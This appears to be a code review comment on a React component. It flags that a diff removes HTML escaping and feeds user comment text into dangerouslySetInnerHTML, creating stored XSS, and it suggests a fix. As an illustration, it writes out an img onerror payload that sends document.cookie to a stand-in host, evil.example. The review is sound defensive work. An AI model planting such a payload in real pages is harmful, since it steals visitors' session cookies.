**Issue:** `escapeHtml` was removed and `body` is assigned directly to `dangerouslySetInnerHTML.__html`. Any HTML/JS in the comment string runs in the victim’s origin (stored XSS if comments are user-supplied).

**Failure mode:** A body like `<img src=x onerror="fetch('https://evil.example?'+document.cookie)">` or `<script>…</script>`-equivalent markup executes when the comment renders. The prior `escapeHtml` path prevented this; this diff reintroduces it with no sanitizer or markdown allowlist.

**Fix:** Restore escaping, or parse markdown into React nodes / sanitize with a strict allowlist (e.g. DOMPurify) before setting `__html`. Do not pass unsanitized strings to `dangerouslySetInnerHTML`.

```suggestion
export function Comment({ body }: { body: string }) {
  return <div className="comment">{body}</div>;
}
```

(The suggestion renders plain text safely via React’s default escaping. If bold/links are required, use a markdown library that emits React elements or sanitize HTML before `__html`.)
